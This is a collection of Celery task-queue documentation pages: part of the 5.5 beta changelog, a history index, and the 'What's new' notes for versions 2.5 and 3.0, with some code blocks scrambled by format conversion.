  - Fixes \#9119: inject dispatch\_uid for retry-wrapped receivers (\#9247)
  - Run all smoke tests CI jobs together (\#9263)
  - Improve documentation on visibility timeout (\#9264)
  - Bump pytest-celery to 1.1.2 (\#9267)
  - Added missing "app.conf.visibility\_timeout" in smoke tests (\#9266)
  - Improved stability with t/smoke/tests/test\_consumer.py (\#9268)
  - Improved Redis container stability in the smoke tests (\#9271)
  - Disabled EXHAUST\_MEMORY tests in Smoke-tasks (\#9272)
  - Marked xfail for test\_reducing\_prefetch\_count with Redis - flaky test (\#9273)
  - Fixed pypy unit tests random failures in the CI (\#9275)
  - Fixed more pypy unit tests random failures in the CI (\#9278)
  - Fix Redis container from aborting randomly (\#9276)
  - Run Integration & Smoke CI tests together after unit tests pass (\#9280)
  - Added "loglevel verbose" to Redis containers in smoke tests (\#9282)
  - Fixed Redis error in the smoke tests: "Possible SECURITY ATTACK detected" (\#9284)
  - Refactored the smoke tests github workflow (\#9285)
  - Increased --reruns 3-\>4 in smoke tests (\#9286)
  - Improve stability of smoke tests (CI and Local) (\#9287)
  - Fixed Smoke tests CI "test-case" labels (specific instead of general) (\#9288)
  - Use assert\_log\_exists instead of wait\_for\_log in worker smoke tests (\#9290)
  - Optimized t/smoke/tests/test\_worker.py (\#9291)
  - Enable smoke tests dockers check before each test starts (\#9292)
  - Relaxed smoke tests flaky tests mechanism (\#9293)
  - Updated quorum queue detection to handle multiple broker instances (\#9294)
  - Non-lazy table creation for database backend (\#9228)
  - Pin pymongo to latest version 4.9 (\#9297)
  - Bump pymongo from 4.9 to 4.9.1 (\#9298)
  - Bump Kombu to v5.4.2 (\#9304)
  - Use rabbitmq:3 in stamping smoke tests (\#9307)
  - Bump pytest-celery to 1.1.3 (\#9308)
  - Added Python 3.13 Support (\#9309)
  - Add log when global qos is disabled (\#9296)
  - Added official release docs (whatsnew) for v5.5 (\#9312)
  - Enable Codespell autofix (\#9313)
  - Pydantic typehints: Fix optional, allow generics (\#9319)
  - Prepare for (pre) release: v5.5.0b4 (\#9322)

## 5.5.0b3

  - release-date  
    2024-09-08

  - release-by  
    Tomer Nosrati

Celery v5.5.0 Beta 3 is now available for testing. Please help us test this version and report any issues.

### Key Highlights

#### Soft Shutdown

The soft shutdown is a new mechanism in Celery that sits between the warm shutdown and the cold shutdown. It sets a time limited "warm shutdown" period, during which the worker will continue to process tasks that are already running. After the soft shutdown ends, the worker will initiate a graceful cold shutdown, stopping all tasks and exiting.

The soft shutdown is disabled by default, and can be enabled by setting the new configuration option `worker_soft_shutdown_timeout`. If a worker is not running any task when the soft shutdown initiates, it will skip the warm shutdown period and proceed directly to the cold shutdown unless the new configuration option `worker_enable_soft_shutdown_on_idle` is set to True. This is useful for workers that are idle, waiting on ETA tasks to be executed that still want to enable the soft shutdown anyways.

The soft shutdown can replace the cold shutdown when using a broker with a visibility timeout mechanism, like \[Redis \<broker-redis\>\](\#redis-\<broker-redis\>) or \[SQS \<broker-sqs\>\](\#sqs-\<broker-sqs\>), to enable a more graceful cold shutdown procedure, allowing the worker enough time to re-queue tasks that were not completed (e.g., `Restoring 1 unacknowledged message(s)`) by resetting the visibility timeout of the unacknowledged messages just before the worker exits completely.

After upgrading to this version, please share your feedback on the new Soft Shutdown mechanism.

Relevant Issues: [\#9213](https://github.com/celery/celery/pull/9213), [\#9231](https://github.com/celery/celery/pull/9231), [\#9238](https://github.com/celery/celery/pull/9238)

  - New \[documentation \<worker-stopping\>\](\#documentation-\<worker-stopping\>) for each shutdown type.
  - New `worker_soft_shutdown_timeout` configuration option.
  - New `worker_enable_soft_shutdown_on_idle` configuration option.

#### REMAP\_SIGTERM

The `REMAP_SIGTERM` "hidden feature" has been tested, \[documented \<worker-REMAP\_SIGTERM\>\](\#documented-\<worker-remap\_sigterm\>) and is now officially supported. This feature allows users to remap the SIGTERM signal to SIGQUIT, to initiate a soft or a cold shutdown using `TERM` instead of `QUIT`.

### Previous Pre-release Highlights

#### Pydantic Support

This release introduces support for Pydantic models in Celery tasks. For more info, see the new pydantic example and PR [\#9023](https://github.com/celery/celery/pull/9023) by @mathiasertl.

After upgrading to this version, please share your feedback on the new Pydantic support.

#### Redis Broker Stability Improvements

The root cause of the Redis broker instability issue has been [identified and resolved](https://github.com/celery/kombu/pull/2007) in the v5.4.0 release of Kombu, which should resolve the disconnections bug and offer additional improvements.

After upgrading to this version, please share your feedback on the Redis broker stability.

Relevant Issues: [\#7276](https://github.com/celery/celery/discussions/7276), [\#8091](https://github.com/celery/celery/discussions/8091), [\#8030](https://github.com/celery/celery/discussions/8030), [\#8384](https://github.com/celery/celery/discussions/8384)

#### Quorum Queues Initial Support

This release introduces the initial support for Quorum Queues with Celery.

See new configuration options for more details:

  - `task_default_queue_type`
  - `worker_detect_quorum_queues`

After upgrading to this version, please share your feedback on the Quorum Queues support.

Relevant Issues: [\#6067](https://github.com/celery/celery/discussions/6067), [\#9121](https://github.com/celery/celery/discussions/9121)

### What's Changed

  - Added SQS (localstack) broker to canvas smoke tests (\#9179)
  - Pin elastic-transport to \<= latest version 8.15.0 (\#9182)
  - Update elasticsearch requirement from \<=8.14.0 to \<=8.15.0 (\#9186)
  - Improve formatting (\#9188)
  - Add basic helm chart for celery (\#9181)
  - Update kafka.rst (\#9194)
  - Update pytest-order to 1.3.0 (\#9198)
  - Update mypy to 1.11.2 (\#9206)
  - All added to routes (\#9204)
  - Fix typos discovered by codespell (\#9212)
  - Use tzdata extras with zoneinfo backports (\#8286)
  - Use <span class="title-ref">docker compose</span> in Contributing's doc build section (\#9219)
  - Failing test for issue \#9119 (\#9215)
  - Fix date\_done timezone issue (\#8385)
  - CI Fixes to smoke tests (\#9223)
  - Fix: passes current request context when pushing to request\_stack (\#9208)
  - Fix broken link in the Using RabbitMQ docs page (\#9226)
  - Added Soft Shutdown Mechanism (\#9213)
  - Added worker\_enable\_soft\_shutdown\_on\_idle (\#9231)
  - Bump cryptography from 43.0.0 to 43.0.1 (\#9233)
  - Added docs regarding the relevancy of soft shutdown and ETA tasks (\#9238)
  - Show broker\_connection\_retry\_on\_startup warning only if it evaluates as False (\#9227)
  - Fixed docker-docs CI failure (\#9240)
  - Added docker cleanup auto-fixture to improve smoke tests stability (\#9243)
  - print is not thread-safe, so should not be used in signal handler (\#9222)
  - Prepare for (pre) release: v5.5.0b3 (\#9244)

## 5.5.0b2

  - release-date  
    2024-08-06

  - release-by  
    Tomer Nosrati

Celery v5.5.0 Beta 2 is now available for testing. Please help us test this version and report any issues.

### Key Highlights

#### Pydantic Support

This release introduces support for Pydantic models in Celery tasks. For more info, see the new pydantic example and PR [\#9023](https://github.com/celery/celery/pull/9023) by @mathiasertl.

After upgrading to this version, please share your feedback on the new Pydantic support.

### Previous Beta Highlights

#### Redis Broker Stability Improvements

The root cause of the Redis broker instability issue has been [identified and resolved](https://github.com/celery/kombu/pull/2007) in the v5.4.0 release of Kombu, which should resolve the disconnections bug and offer additional improvements.

After upgrading to this version, please share your feedback on the Redis broker stability.

Relevant Issues: [\#7276](https://github.com/celery/celery/discussions/7276), [\#8091](https://github.com/celery/celery/discussions/8091), [\#8030](https://github.com/celery/celery/discussions/8030), [\#8384](https://github.com/celery/celery/discussions/8384)

#### Quorum Queues Initial Support

This release introduces the initial support for Quorum Queues with Celery.

See new configuration options for more details:

  - `task_default_queue_type`
  - `worker_detect_quorum_queues`

After upgrading to this version, please share your feedback on the Quorum Queues support.

Relevant Issues: [\#6067](https://github.com/celery/celery/discussions/6067), [\#9121](https://github.com/celery/celery/discussions/9121)

### What's Changed

  - Bump pytest from 8.3.1 to 8.3.2 (\#9153)
  - Remove setuptools deprecated test command from setup.py (\#9159)
  - Pin pre-commit to latest version 3.8.0 from Python 3.9 (\#9156)
  - Bump mypy from 1.11.0 to 1.11.1 (\#9164)
  - Change "docker-compose" to "docker compose" in Makefile (\#9169)
  - update python versions and docker compose (\#9171)
  - Add support for Pydantic model validation/serialization (fixes \#8751) (\#9023)
  - Allow local dynamodb to be installed on another host than localhost (\#8965)
  - Terminate job implementation for gevent concurrency backend (\#9083)
  - Bump Kombu to v5.4.0 (\#9177)
  - Add check for soft\_time\_limit and time\_limit values (\#9173)
  - Prepare for (pre) release: v5.5.0b2 (\#9178)

## 5.5.0b1

  - release-date  
    2024-07-24

  - release-by  
    Tomer Nosrati

Celery v5.5.0 Beta 1 is now available for testing. Please help us test this version and report any issues.

### Key Highlights

#### Redis Broker Stability Improvements

The root cause of the Redis broker instability issue has been [identified and resolved](https://github.com/celery/kombu/pull/2007) in the release-candidate for Kombu v5.4.0. This beta release has been upgraded to use the new Kombu RC version, which should resolve the disconnections bug and offer additional improvements.

After upgrading to this version, please share your feedback on the Redis broker stability.

Relevant Issues: [\#7276](https://github.com/celery/celery/discussions/7276), [\#8091](https://github.com/celery/celery/discussions/8091), [\#8030](https://github.com/celery/celery/discussions/8030), [\#8384](https://github.com/celery/celery/discussions/8384)

#### Quorum Queues Initial Support

This release introduces the initial support for Quorum Queues with Celery.

See new configuration options for more details:

  - `task_default_queue_type`
  - `worker_detect_quorum_queues`

After upgrading to this version, please share your feedback on the Quorum Queues support.

Relevant Issues: [\#6067](https://github.com/celery/celery/discussions/6067), [\#9121](https://github.com/celery/celery/discussions/9121)

### What's Changed

  - (docs): use correct version celery v.5.4.x (\#8975)
  - Update mypy to 1.10.0 (\#8977)
  - Limit pymongo\<4.7 when Python \<= 3.10 due to breaking changes in 4.7 (\#8988)
  - Bump pytest from 8.1.1 to 8.2.0 (\#8987)
  - Update README to Include FastAPI in Framework Integration Section (\#8978)
  - Clarify return values of ...\_on\_commit methods (\#8984)
  - add kafka broker docs (\#8935)
  - Limit pymongo\<4.7 regardless of Python version (\#8999)
  - Update pymongo\[srv\] requirement from \<4.7,\>=4.0.2 to \>=4.0.2,\<4.8 (\#9000)
  - Update elasticsearch requirement from \<=8.13.0 to \<=8.13.1 (\#9004)
  - security: SecureSerializer: support generic low-level serializers (\#8982)
  - don't kill if pid same as file (\#8997) (\#8998)
  - Update cryptography to 42.0.6 (\#9005)
  - Bump cryptography from 42.0.6 to 42.0.7 (\#9009)
  - Added -vv to unit, integration and smoke tests (\#9014)
  - SecuritySerializer: ensure pack separator will not be conflicted with serialized fields (\#9010)
  - Update sphinx-click to 5.2.2 (\#9025)
  - Bump sphinx-click from 5.2.2 to 6.0.0 (\#9029)
  - Fix a typo to display the help message in first-steps-with-django (\#9036)
  - Pinned requests to v2.31.0 due to docker-py bug \#3256 (\#9039)
  - Fix certificate validity check (\#9037)
  - Revert "Pinned requests to v2.31.0 due to docker-py bug \#3256" (\#9043)
  - Bump pytest from 8.2.0 to 8.2.1 (\#9035)
  - Update elasticsearch requirement from \<=8.13.1 to \<=8.13.2 (\#9045)
  - Fix detection of custom task set as class attribute with Django (\#9038)
  - Update elastic-transport requirement from \<=8.13.0 to \<=8.13.1 (\#9050)
  - Bump pycouchdb from 1.14.2 to 1.16.0 (\#9052)
  - Update pytest to 8.2.2 (\#9060)
  - Bump cryptography from 42.0.7 to 42.0.8 (\#9061)
  - Update elasticsearch requirement from \<=8.13.2 to \<=8.14.0 (\#9069)
  - \[enhance feature\] Crontab schedule: allow using month names (\#9068)
  - Enhance tox environment: \[testenv:clean\] (\#9072)
  - Clarify docs about Reserve one task at a time (\#9073)
  - GCS docs fixes (\#9075)
  - Use hub.remove\_writer instead of hub.remove for write fds (\#4185) (\#9055)
  - Class method to process crontab string (\#9079)
  - Fixed smoke tests env bug when using integration tasks that rely on Redis (\#9090)
  - Bugfix - a task will run multiple times when chaining chains with groups (\#9021)
  - Bump mypy from 1.10.0 to 1.10.1 (\#9096)
  - Don't add a separator to global\_keyprefix if it already has one (\#9080)
  - Update pymongo\[srv\] requirement from \<4.8,\>=4.0.2 to \>=4.0.2,\<4.9 (\#9111)
  - Added missing import in examples for Django (\#9099)
  - Bump Kombu to v5.4.0rc1 (\#9117)
  - Removed skipping Redis in t/smoke/tests/test\_consumer.py tests (\#9118)
  - Update pytest-subtests to 0.13.0 (\#9120)
  - Increased smoke tests CI timeout (\#9122)
  - Bump Kombu to v5.4.0rc2 (\#9127)
  - Update zstandard to 0.23.0 (\#9129)
  - Update pytest-subtests to 0.13.1 (\#9130)
  - Changed retry to tenacity in smoke tests (\#9133)
  - Bump mypy from 1.10.1 to 1.11.0 (\#9135)
  - Update cryptography to 43.0.0 (\#9138)
  - Update pytest to 8.3.1 (\#9137)
  - Added support for Quorum Queues (\#9121)
  - Bump Kombu to v5.4.0rc3 (\#9139)
  - Cleanup in Changelog.rst (\#9141)
  - Update Django docs for CELERY\_CACHE\_BACKEND (\#9143)
  - Added missing docs to previous releases (\#9144)
  - Fixed a few documentation build warnings (\#9145)
  - docs(README): link invalid (\#9148)
  - Prepare for (pre) release: v5.5.0b1 (\#9146)

---

index.md

---

# History

This section contains historical change histories, for the latest version please visit \[changelog\](\#changelog).

  - Release  

  - Date  

<div class="toctree" data-maxdepth="2">

whatsnew-5.5 changelog-5.5 whatsnew-5.4 changelog-5.4 whatsnew-5.3 changelog-5.3 whatsnew-5.1 changelog-5.1 whatsnew-5.0 changelog-5.0 whatsnew-4.4 changelog-4.4 whatsnew-4.3 changelog-4.3 whatsnew-4.2 changelog-4.2 whatsnew-4.1 changelog-4.1 whatsnew-4.0 changelog-4.0 whatsnew-3.1 changelog-3.1 whatsnew-3.0 changelog-3.0 whatsnew-2.5 changelog-2.5 changelog-2.4 changelog-2.3 changelog-2.2 changelog-2.1 changelog-2.0 changelog-1.0

</div>

---

whatsnew-2.5.md

---

# What's new in Celery 2.5

Celery aims to be a flexible and reliable, best-of-breed solution to process vast amounts of messages in a distributed fashion, while providing operations with the tools to maintain such a system.

Celery has a large and diverse community of users and contributors, you should come join us \[on IRC \<irc-channel\>\](\#on-irc-\<irc-channel\>) or \[our mailing-list \<mailing-list\>\](\#our-mailing-list-\<mailing-list\>).

To read more about Celery you should visit our [website](http://celeryproject.org/).

While this version is backward compatible with previous versions it's important that you read the following section.

If you use Celery in combination with Django you must also read the <span class="title-ref">django-celery changelog \<djcelery:version-2.5.0\></span> and upgrade to `django-celery 2.5 <django-celery>`.

This version is officially supported on CPython 2.5, 2.6, 2.7, 3.2 and 3.3, as well as PyPy and Jython.

<div class="contents" data-local="">

</div>

## Important Notes

### Broker connection pool now enabled by default

The default limit is 10 connections, if you have many threads/green-threads using connections at the same time you may want to tweak this limit to avoid contention.

See the `BROKER_POOL_LIMIT` setting for more information.

Also note that publishing tasks will be retried by default, to change this default or the default retry policy see `CELERY_TASK_PUBLISH_RETRY` and `CELERY_TASK_PUBLISH_RETRY_POLICY`.

### Rabbit Result Backend: Exchange is no longer *auto delete*

The exchange used for results in the Rabbit (AMQP) result backend used to have the *auto\_delete* flag set, which could result in a race condition leading to an annoying warning.

<div class="admonition">

For RabbitMQ users

Old exchanges created with the *auto\_delete* flag enabled has to be removed.

The `camqadm` command can be used to delete the previous exchange:

  - \`\`\`console  
    $ camqadm exchange.delete celeryresults

As an alternative to deleting the old exchange you can configure a new name for the exchange:

    CELERY_RESULT_EXCHANGE = 'celeryresults2'

But you have to make sure that all clients and workers use this new setting, so they're updated to use the same exchange name.

</div>

Solution for hanging workers (but must be manually enabled) `` ` -----------------------------------------------------------  The `CELERYD_FORCE_EXECV` setting has been added to solve a problem with deadlocks that originate when threads and fork is mixed together: ``\`python CELERYD\_FORCE\_EXECV = True

This setting is recommended for all users using the prefork pool, `` ` but especially users also using time limits or a max tasks per child setting.  - See `Python Issue 6721`_ to read more about this issue, and why   resorting to `~os.execv `` is the only safe solution.

Enabling this option will result in a slight performance penalty when new child worker processes are started, and it will also increase memory usage (but many platforms are optimized, so the impact may be minimal). Considering that it ensures reliability when replacing lost worker processes, it should be worth it.

  - It's already the default behavior on Windows.
  - It will be the default behavior for all platforms in a future version.

## Optimization

  - The code path used when the worker executes a task has been heavily optimized, meaning the worker is able to process a great deal more tasks/second compared to previous versions. As an example the solo pool can now process up to 15000 tasks/second on a 4 core MacBook Pro when using the `pylibrabbitmq` transport, where it previously could only do 5000 tasks/second.
  - The task error tracebacks are now much shorter.
  - Fixed a noticeable delay in task processing when rate limits are enabled.

## Deprecation Time-line Changes

### Removals

  - The old <span class="title-ref">TaskSet</span> signature of `(task_name, list_of_tasks)` can no longer be used (originally scheduled for removal in 2.4). The deprecated `.task_name` and `.task` attributes has also been removed.
  - The functions `celery.execute.delay_task`, `celery.execute.apply`, and `celery.execute.apply_async` has been removed (originally) scheduled for removal in 2.3).
  - The built-in `ping` task has been removed (originally scheduled for removal in 2.3). Please use the ping broadcast command instead.
  - It's no longer possible to import `subtask` and `TaskSet` from `celery.task.base`, please import them from `celery.task` instead (originally scheduled for removal in 2.4).

### Deprecated modules

  - The `celery.decorators` module has changed status from pending deprecation to deprecated, and is scheduled for removal in version 4.0. The `celery.task` module must be used instead.

## News

### Timezone support

Celery can now be configured to treat all incoming and outgoing dates as UTC, and the local timezone can be configured.

This isn't yet enabled by default, since enabling time zone support means workers running versions pre-2.5 will be out of sync with upgraded workers.

To enable UTC you have to set `CELERY_ENABLE_UTC`:

    CELERY_ENABLE_UTC = True

When UTC is enabled, dates and times in task messages will be converted to UTC, and then converted back to the local timezone when received by a worker.

You can change the local timezone using the `CELERY_TIMEZONE` setting. Installing the `pytz` library is recommended when using a custom timezone, to keep timezone definition up-to-date, but it will fallback to a system definition of the timezone if available.

UTC will enabled by default in version 3.0.

\> **Note** \> `django-celery` will use the local timezone as specified by the `TIME_ZONE` setting, it will also honor the new [USE\_TZ](https://docs.djangoproject.com/en/dev/topics/i18n/timezones/) setting introduced in Django 1.4.

### New security serializer using cryptographic signing

A new serializer has been added that signs and verifies the signature of messages.

The name of the new serializer is `auth`, and needs additional configuration to work (see \[conf-security\](\#conf-security)).

<div class="seealso">

\[guide-security\](\#guide-security)

</div>

Contributed by Mher Movsisyan.

### New `CELERY_ANNOTATIONS` setting

This new setting enables the configuration to modify task classes and their attributes.

The setting can be a dict, or a list of annotation objects that filter for tasks and return a map of attributes to change.

As an example, this is an annotation to change the `rate_limit` attribute for the `tasks.add` task:

`` `python     CELERY_ANNOTATIONS = {'tasks.add': {'rate_limit': '10/s'}}  or change the same for all tasks:  .. code-block:: python     CELERY_ANNOTATIONS = {'*': {'rate_limit': '10/s'}}  You can change methods too, for example the ``on\_failure`handler:  .. code-block:: python      def my_on_failure(self, exc, task_id, args, kwargs, einfo):         print('Oh no! Task failed: %r' % (exc,))      CELERY_ANNOTATIONS = {'*': {'on_failure': my_on_failure}}  If you need more flexibility then you can also create objects`\` that filter for tasks to annotate:

`` `python     class MyAnnotate(object):          def annotate(self, task):             if task.name.startswith('tasks.'):                 return {'rate_limit': '10/s'}      CELERY_ANNOTATIONS = (MyAnnotate(), {other_annotations,}) ``current`provides the currently executing task`\` -------------------------------------------------

The new <span class="title-ref">celery.task.current</span> proxy will always give the currently executing task.

**Example**:

`` `python     from celery.task import current, task      @task     def update_twitter_status(auth, message):         twitter = Twitter(auth)         try:             twitter.update_status(message)         except twitter.FailWhale, exc:             # retry in 10 seconds.             current.retry(countdown=10, exc=exc)  Previously you'd've to type ``update\_twitter\_status.retry(…)`  `\` here, which can be annoying for long task names.

<div class="note">

<div class="title">

Note

</div>

This won't work if the task function is called directly (i.e., `update_twitter_status(a, b)`). For that to work `apply` must be used: `update_twitter_status.apply((a, b))`.

</div>

### In Other News

  - Now depends on Kombu 2.1.0.

  - Efficient Chord support for the Memcached backend (Issue \#533)
    
    > This means Memcached joins Redis in the ability to do non-polling chords.
    > 
    > Contributed by Dan McGee.

  - Adds Chord support for the Rabbit result backend (amqp)
    
    > The Rabbit result backend can now use the fallback chord solution.

  - Sending `QUIT` to `celeryd` will now cause it cold terminate.
    
    > That is, it won't finish executing the tasks it's currently working on.
    > 
    > Contributed by Alec Clowes.

  - New "detailed" mode for the Cassandra backend.
    
    > Allows to have a "detailed" mode for the Cassandra backend. Basically the idea is to keep all states using Cassandra wide columns. New states are then appended to the row as new columns, the last state being the last column.
    > 
    > See the `CASSANDRA_DETAILED_MODE` setting.
    > 
    > Contributed by Steeve Morin.

  - The Crontab parser now matches Vixie Cron behavior when parsing ranges with steps (e.g., 1-59/2).
    
    > Contributed by Daniel Hepper.

  - `celerybeat` can now be configured on the command-line like `celeryd`.
    
    Additional configuration must be added at the end of the argument list followed by `--`, for example:
    
      - \`\`\`console  
        $ celerybeat -l info -- celerybeat.max\_loop\_interval=10.0

  - Now limits the number of frames in a traceback so that `celeryd` doesn't crash on maximum recursion limit exceeded exceptions (Issue \#615).
    
    > The limit is set to the current recursion limit divided by 8 (which is 125 by default).
    > 
    > To get or set the current recursion limit use <span class="title-ref">sys.getrecursionlimit</span> and <span class="title-ref">sys.setrecursionlimit</span>.

  - More information is now preserved in the pickleable traceback.
    
    > This has been added so that Sentry can show more details.
    > 
    > Contributed by Sean O'Connor.

  - CentOS init-script has been updated and should be more flexible.
    
    > Contributed by Andrew McFague.

  - MongoDB result backend now supports `forget()`.
    
    > Contributed by Andrew McFague

  - `task.retry()` now re-raises the original exception keeping the original stack trace.
    
    > Suggested by :github\_user:<span class="title-ref">ojii</span>.

  - The <span class="title-ref">--uid</span> argument to daemons now uses `initgroups()` to set groups to all the groups the user is a member of.
    
    > Contributed by Łukasz Oleś.

  - `celeryctl`: Added `shell` command.
    
    > The shell will have the current\_app (`celery`) and all tasks automatically added to locals.

  - `celeryctl`: Added `migrate` command.
    
    > The migrate command moves all tasks from one broker to another. Note that this is experimental and you should have a backup of the data before proceeding.
    > 
    > **Examples**:
    > 
    > ``` console
    > $ celeryctl migrate redis://localhost amqp://localhost
    > $ celeryctl migrate amqp://localhost//v1 amqp://localhost//v2
    > $ python manage.py celeryctl migrate django:// redis://
    > ```

  - Routers can now override the `exchange` and `routing_key` used to create missing queues (Issue \#577).
    
    > By default this will always use the name of the queue, but you can now have a router return exchange and routing\_key keys to set them.
    > 
    > This is useful when using routing classes which decides a destination at run-time.
    > 
    > Contributed by Akira Matsuzaki.

  - Redis result backend: Adds support for a `max_connections` parameter.
    
    > It's now possible to configure the maximum number of simultaneous connections in the Redis connection pool used for results.
    > 
    > The default max connections setting can be configured using the `CELERY_REDIS_MAX_CONNECTIONS` setting, or it can be changed individually by `RedisBackend(max_connections=int)`.
    > 
    > Contributed by Steeve Morin.

  - Redis result backend: Adds the ability to wait for results without polling.
    
    > Contributed by Steeve Morin.

  - MongoDB result backend: Now supports save and restore `taskset`.
    
    > Contributed by Julien Poissonnier.

  - There's a new \[guide-security\](\#guide-security) guide in the documentation.

  - The init-scripts have been updated, and many bugs fixed.
    
    > Contributed by Chris Streeter.

  - User (tilde) is now expanded in command-line arguments.

  - Can now configure `CELERYCTL` environment variable in `/etc/default/celeryd`.
    
    > While not necessary for operation, `celeryctl` is used for the `celeryd status` command, and the path to `celeryctl` must be configured for that to work.
    > 
    > The daemonization cookbook contains examples.
    > 
    > Contributed by Jude Nagurney.

  - The MongoDB result backend can now use Replica Sets.
    
    > Contributed by Ivan Metzlar.

  - gevent: Now supports autoscaling (Issue \#599).
    
    > Contributed by Mark Lavin.

  - multiprocessing: Mediator thread is now always enabled, even though rate limits are disabled, as the pool semaphore is known to block the main thread, causing broadcast commands and shutdown to depend on the semaphore being released.

Fixes `` ` =====  - Exceptions that are re-raised with a new exception object now keeps   the original stack trace.  - Windows: Fixed the ``no handlers found for multiprocessing`warning.  - Windows: The`celeryd`program can now be used.      Previously Windows users had to launch`celeryd`using`python -m celery.bin.celeryd`.  - Redis result backend: Now uses`SETEX``command to set result key,   and expiry atomically.      Suggested by :github_user:`yaniv-aknin`.  -``celeryd``: Fixed a problem where shutdown hanged when :kbd:`Control-c`   was used to terminate.  -``celeryd`: No longer crashes when channel errors occur.      Fix contributed by Roger Hu.  - Fixed memory leak in the eventlet pool, caused by the   use of`greenlet.getcurrent``.      Fix contributed by Ignas Mikalajūnas.   - Cassandra backend: No longer uses `pycassa.connect` which is   deprecated since :pypi:`pycassa` 1.4.      Fix contributed by Jeff Terrace.  - Fixed unicode decode errors that could occur while sending error emails.      Fix contributed by Seong Wun Mun.  -``celery.bin`programs now always defines`\_\_package\_\_`as recommended   by PEP-366.  -`send\_task``now emits a warning when used in combination with   :setting:`CELERY_ALWAYS_EAGER` (Issue #581).      Contributed by Mher Movsisyan.  -``apply\_async`now forwards the original keyword arguments to`apply``when :setting:`CELERY_ALWAYS_EAGER` is enabled.  -``celeryev`now tries to re-establish the connection if the connection   to the broker is lost (Issue #574).  -`celeryev`: Fixed a crash occurring if a task has no associated worker   information.      Fix contributed by Matt Williamson.  - The current date and time is now consistently taken from the current loaders`now`method.  - Now shows helpful error message when given a configuration module ending in`.py`that can't be imported.  -`celeryctl``: The :option:`--expires <celery call --expires>` and   :option:`--eta <celery call --eta>` arguments to the apply command   can now be an ISO-8601 formatted string.  -``celeryctl`now exits with exit status`EX\_UNAVAILABLE\`\` (69) if no replies have been received.

---

whatsnew-3.0.md

---

# What's new in Celery 3.0 (Chiastic Slide)

Celery is a simple, flexible, and reliable distributed system to process vast amounts of messages, while providing operations with the tools required to maintain such a system.

It's a task queue with focus on real-time processing, while also supporting task scheduling.

Celery has a large and diverse community of users and contributors, you should come join us \[on IRC \<irc-channel\>\](\#on-irc-\<irc-channel\>) or \[our mailing-list \<mailing-list\>\](\#our-mailing-list-\<mailing-list\>).

To read more about Celery you should go read the \[introduction \<intro\>\](\#introduction-\<intro\>).

While this version is backward compatible with previous versions it's important that you read the following section.

If you use Celery in combination with Django you must also read the [django-celery changelog](https://github.com/celery/django-celery/tree/master/Changelog) and upgrade to `django-celery 3.0 <django-celery>`.

This version is officially supported on CPython 2.5, 2.6, 2.7, 3.2 and 3.3, as well as PyPy and Jython.

## Highlights

<div class="topic">

**Overview**

  - A new and improved API, that's both simpler and more powerful.
    
    > Everyone must read the new \[first-steps\](\#first-steps) tutorial, and the new \[next-steps\](\#next-steps) tutorial. Oh, and why not reread the user guide while you're at it :)
    > 
    > There are no current plans to deprecate the old API, so you don't have to be in a hurry to port your applications.

  - The worker is now thread-less, giving great performance improvements.

  - The new "Canvas" makes it easy to define complex work-flows.
    
    > Ever wanted to chain tasks together? This is possible, but not just that, now you can even chain together groups and chords, or even combine multiple chains.
    > 
    > Read more in the \[Canvas \<guide-canvas\>\](\#canvas-\<guide-canvas\>) user guide.

  - All of Celery's command-line programs are now available from a single `celery` umbrella command.

  - This is the last version to support Python 2.5.
    
    > Starting with Celery 3.1, Python 2.6 or later is required.

  - Support for the new `librabbitmq` C client.
    
    > Celery will automatically use the `librabbitmq` module if installed, which is a very fast and memory-optimized replacement for the `amqp` module.

  - Redis support is more reliable with improved ack emulation.

  - Celery now always uses UTC

  - Over 600 commits, 30k additions/36k deletions.
    
    > In comparison 1.0➝ 2.0 had 18k additions/8k deletions.

</div>

<div class="contents" data-local="" data-depth="2">

</div>

## Important Notes

### Broadcast exchanges renamed

The workers remote control command exchanges has been renamed (a new `pidbox` name), this is because the `auto_delete` flag on the exchanges has been removed, and that makes it incompatible with earlier versions.

You can manually delete the old exchanges if you want, using the `celery amqp` command (previously called `camqadm`):

`` `console     $ celery amqp exchange.delete celeryd.pidbox     $ celery amqp exchange.delete reply.celeryd.pidbox  Event-loop ``\` ----------

The worker is now running *without threads* when used with RabbitMQ (AMQP), or Redis as a broker, resulting in:

  - Much better overall performance.
  - Fixes several edge case race conditions.
  - Sub-millisecond timer precision.
  - Faster shutdown times.

The transports supported are: `py-amqp` `librabbitmq`, `redis`, and `amqplib`. Hopefully this can be extended to include additional broker transports in the future.

For increased reliability the `CELERY_FORCE_EXECV` setting is enabled by default if the event-loop isn't used.

### New `celery` umbrella command

All Celery's command-line programs are now available from a single `celery` umbrella command.

You can see a list of sub-commands and options by running:

`` `console     $ celery help  Commands include:  - ``celery worker`(previously`celeryd`).  -`celery beat`(previously`celerybeat`).  -`celery amqp`(previously`camqadm`).  The old programs are still available (`celeryd`,`celerybeat`, etc),`\` but you're discouraged from using them.

### Now depends on `billiard`

Billiard is a fork of the multiprocessing containing the no-execv patch by `sbt` (<http://bugs.python.org/issue8713>), and also contains the pool improvements previously located in Celery.

This fork was necessary as changes to the C extension code was required for the no-execv patch to work.

  - Issue \#625
  - Issue \#627
  - Issue \#640
  - <span class="title-ref">django-celery \#122 \<https://github.com/celery/django-celery/issues/122</span>
  - <span class="title-ref">django-celery \#124 \<https://github.com/celery/django-celery/issues/122</span>

### `celery.app.task` no longer a package

The `celery.app.task` module is now a module instead of a package.

The `setup.py` install script will try to remove the old package, but if that doesn't work for some reason you have to remove it manually. This command helps:

`` `console     $ rm -r $(dirname $(python -c 'import celery;print(celery.__file__)'))/app/task/  If you experience an error like ``ImportError: cannot import name \_unpickle\_task`,`\` you just have to remove the old package and everything is fine.

### Last version to support Python 2.5

The 3.0 series will be last version to support Python 2.5, and starting from 3.1 Python 2.6 and later will be required.

With several other distributions taking the step to discontinue Python 2.5 support, we feel that it is time too.

Python 2.6 should be widely available at this point, and we urge you to upgrade, but if that's not possible you still have the option to continue using the Celery 3.0, and important bug fixes introduced in Celery 3.1 will be back-ported to Celery 3.0 upon request.

### UTC timezone is now used

This means that ETA/countdown in messages aren't compatible with Celery versions prior to 2.5.

You can disable UTC and revert back to old local time by setting the `CELERY_ENABLE_UTC` setting.

### Redis: Ack emulation improvements

> Reducing the possibility of data loss.
> 
> Acks are now implemented by storing a copy of the message when the message is consumed. The copy isn't removed until the consumer acknowledges or rejects it.
> 
> This means that unacknowledged messages will be redelivered either when the connection is closed, or when the visibility timeout is exceeded.
> 
>   - Visibility timeout
>     
>     > This is a timeout for acks, so that if the consumer doesn't ack the message within this time limit, the message is redelivered to another consumer.
>     > 
